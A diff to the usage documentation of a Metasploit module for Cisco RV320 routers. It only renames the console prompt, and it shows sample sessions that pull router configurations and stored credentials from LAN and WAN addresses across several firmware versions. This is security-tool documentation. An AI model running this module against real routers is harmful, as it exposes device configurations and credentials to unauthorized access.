@@ -30,11 +30,11 @@ More context is available from [Rapid7's blog post](https://blog.rapid7.com/2019
 #### Against firmware version 1.4.2.15, on the LAN interface, port 443:
 
 ```
-msf5 >
-msf5 > use auxiliary/gather/cisco_rv320_config
-msf5 auxiliary(gather/cisco_rv320_config) > set RHOSTS 192.168.1.1
+msf >
+msf > use auxiliary/gather/cisco_rv320_config
+msf auxiliary(gather/cisco_rv320_config) > set RHOSTS 192.168.1.1
 RHOSTS => 192.168.1.1
-msf5 auxiliary(gather/cisco_rv320_config) > run
+msf auxiliary(gather/cisco_rv320_config) > run
 
 [+] Stored configuration (128628 bytes) to /home/administrator/.msf4/loot/20190206165015_default_192.168.1.1_cisco.rv.config_434637.txt
 [*] Scanned 1 of 1 hosts (100% complete)
@@ -44,15 +44,15 @@ msf5 auxiliary(gather/cisco_rv320_config) > run
 #### Against firmware version 1.4.2.15, on the WAN interface, port 8007:
 
 ```
-msf5 >
-msf5 > use auxiliary/gather/cisco_rv320_config
-msf5 auxiliary(gather/cisco_rv320_config) > set RHOSTS 203.0.113.54
+msf >
+msf > use auxiliary/gather/cisco_rv320_config
+msf auxiliary(gather/cisco_rv320_config) > set RHOSTS 203.0.113.54
 RHOSTS => 203.0.113.54
-msf5 auxiliary(gather/cisco_rv320_config) > set RPORT 8007
+msf auxiliary(gather/cisco_rv320_config) > set RPORT 8007
 RPORT => 8007
-msf5 auxiliary(gather/cisco_rv320_config) > set SSL false
+msf auxiliary(gather/cisco_rv320_config) > set SSL false
 SSL => false
-msf5 auxiliary(gather/cisco_rv320_config) > run
+msf auxiliary(gather/cisco_rv320_config) > run
 
 [+] Stored configuration (128628 bytes) to /home/administrator/.msf4/loot/20190206165015_default_203.0.113.54_cisco.rv.config_434637.txt
 [*] Scanned 1 of 1 hosts (100% complete)
@@ -62,11 +62,11 @@ msf5 auxiliary(gather/cisco_rv320_config) > run
 #### Against firmware version 1.4.2.17, on the LAN interface, port 443:
 
 ```
-msf5 >
-msf5 > use auxiliary/gather/cisco_rv320_config
-msf5 auxiliary(gather/cisco_rv320_config) > set RHOSTS 192.168.1.1
+msf >
+msf > use auxiliary/gather/cisco_rv320_config
+msf auxiliary(gather/cisco_rv320_config) > set RHOSTS 192.168.1.1
 RHOSTS => 192.168.1.1
-msf5 auxiliary(gather/cisco_rv320_config) > run
+msf auxiliary(gather/cisco_rv320_config) > run
 
 [+] Stored configuration (128628 bytes) to /home/administrator/.msf4/loot/20190206165015_default_192.168.1.1_cisco.rv.config_434637.txt
 [*] Scanned 1 of 1 hosts (100% complete)
@@ -76,11 +76,11 @@ msf5 auxiliary(gather/cisco_rv320_config) > run
 #### Against newer firmware (>= 1.4.2.19), on the LAN interface, port 443:
 
 ```
-msf5 >
-msf5 > use auxiliary/gather/cisco_rv320_config
-msf5 auxiliary(gather/cisco_rv320_config) > set RHOSTS 192.168.1.1
+msf >
+msf > use auxiliary/gather/cisco_rv320_config
+msf auxiliary(gather/cisco_rv320_config) > set RHOSTS 192.168.1.1
 RHOSTS => 192.168.1.1
-msf5 auxiliary(gather/cisco_rv320_config) > run
+msf auxiliary(gather/cisco_rv320_config) > run
 
 [-] Auxiliary aborted due to failure: not-vulnerable: Response suggests device is patched
 [*] Auxiliary module execution completed
@@ -89,7 +89,7 @@ msf5 auxiliary(gather/cisco_rv320_config) > run
 #### If module succeeds, check the database:
 
 ```
-msf5 auxiliary(gather/cisco_rv320_config) > hosts
+msf auxiliary(gather/cisco_rv320_config) > hosts
 
 Hosts
 =====
@@ -101,7 +101,7 @@ address      mac                name          os_name  os_flavor  os_sp  purpose
 ```
 
 ```
-msf5 auxiliary(gather/cisco_rv320_config) > creds
+msf auxiliary(gather/cisco_rv320_config) > creds
 Credentials
 ===========
 
@@ -112,7 +112,7 @@ host         origin       service          public  private                      
 ```
 
 ```
-msf5 auxiliary(gather/cisco_rv320_config) > loot
+msf auxiliary(gather/cisco_rv320_config) > loot
 
 Loot
 ====
